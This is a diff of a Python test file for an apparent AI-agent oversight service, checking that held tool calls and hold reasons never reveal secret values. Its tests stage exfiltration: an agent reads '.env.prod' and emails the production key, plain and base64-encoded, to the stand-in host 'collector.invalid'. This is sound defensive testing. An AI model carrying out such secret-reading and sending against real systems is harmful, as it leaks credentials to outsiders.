@@ -13,7 +13,7 @@ from cressey.domain.runs import Mandate, Risk
 from cressey.engine import decide
 from cressey.engine.agent_text import WAY_OUT, fallback, finish
 from cressey.llm.clients import ModelUnavailable
-from cressey.scan.secrets import redact
+from cressey.scan.secrets import hide, scan
 from cressey.testing import QuietJudge, agent, api, next_hold, no_to_all, serving, users
 
 pytestmark = pytest.mark.anyio
@@ -169,23 +169,53 @@ async def test_secret_values_never_leave_through_the_api(served):
 async def test_a_secret_in_a_recipient_never_shows_in_the_hold_reason(served):
     """Audit finding 17: the egress rule names the recipient in the reason, and the reasons
     were kept as the floor made them while the arguments were redacted."""
-    encoded = base64.b64encode(PROD_KEY.encode()).decode()
+    # The key as it is, then in base64 with no padding, with one = and with two.
+    recipients = [PROD_KEY] + [
+        base64.b64encode(f"{prefix}{PROD_KEY}".encode()).decode()
+        for prefix in ("", "k=", "key=")
+    ]
     run = await new_run(served, {"may_send_to": ["@example.test"]}, kind="control")
     async with agent(served, run["key"]) as a:
         await a.call_tool("read_file", {"path": ".env.prod"})
-        for to in (f"{PROD_KEY}@collector.invalid", f"{encoded}@collector.invalid"):
-            await a.call_tool("send_email", {"to": to, "subject": "s", "body": "b"})
+        for who in recipients:
+            mail = {"to": f"{who}@collector.invalid", "subject": "s", "body": "b"}
+            await a.call_tool("send_email", mail)
     pages = {
         path: (await api(served, "GET", path)).text
         for path in (f"/api/runs/{run['id']}", "/api/incidents")
     }
     leaks = [
-        path for path, text in pages.items() if PROD_KEY in text or encoded in text
+        path for path, text in pages.items() if any(who in text for who in recipients)
     ]
     assert leaks == []
     _, *mails = await steps(served, run)
-    assert [s["status"] for s in mails] == ["would_hold", "would_hold"]
+    assert [s["status"] for s in mails] == ["would_hold"] * len(recipients)
     assert all("[secret:" in s["reason"] for s in mails)
+
+
+async def test_a_secret_only_the_calls_own_scan_finds_never_shows_in_the_hold_reason(
+    served,
+):
+    """The scan of the whole call finds a value its body names (`api_key: ...`), and the
+    arguments hide it; the reason names it as a recipient and hid only what the run knew.
+    Text follows the value in the body: the scan reads the call as one JSON line, so a value
+    that ends it comes out with the closing quote."""
+    unseen = "unseen-value-4242"  # this run never read it
+    run = await new_run(served, {"may_send_to": ["@example.test"]}, kind="control")
+    mail = {
+        "to": f"{unseen}@collector.invalid",
+        "subject": "s",
+        "body": f"api_key: {unseen} (rotated)",
+    }
+    async with agent(served, run["key"]) as a:
+        await a.call_tool("send_email", mail)
+    pages = {
+        path: (await api(served, "GET", path)).text
+        for path in (f"/api/runs/{run['id']}", "/api/incidents")
+    }
+    assert [path for path, text in pages.items() if unseen in text] == []
+    [step] = await steps(served, run)
+    assert "[secret:" in step["reason"]
 
 
 async def test_a_hold_shows_its_deadline_and_the_decision_its_time(served):
@@ -401,15 +431,20 @@ async def test_arguments_are_redacted_off_the_event_loop(served, monkeypatch):
     """Stress test F5: a large argument's redaction stalled every run on the event loop."""
     on_loop: list[bool] = []
 
-    def spy(text: str, known: Mapping[str, str] | None = None) -> str:
-        try:
-            asyncio.get_running_loop()
-            on_loop.append(True)
-        except RuntimeError:
-            on_loop.append(False)
-        return redact(text, known)
+    def off_loop(real):
+        def spy(*args):
+            try:
+                asyncio.get_running_loop()
+                on_loop.append(True)
+            except RuntimeError:
+                on_loop.append(False)
+            return real(*args)
 
-    monkeypatch.setattr(decide, "redact", spy)
+        return spy
+
+    # What the engine runs on the arguments: the scan of the call, then the hiding.
+    monkeypatch.setattr(decide, "scan", off_loop(scan))
+    monkeypatch.setattr(decide, "hide", off_loop(hide))
     run = await new_run(served)
     async with agent(served, run["key"]) as a:
         await a.call_tool("write_file", {"path": "a.txt", "content": "x" * 100_000})
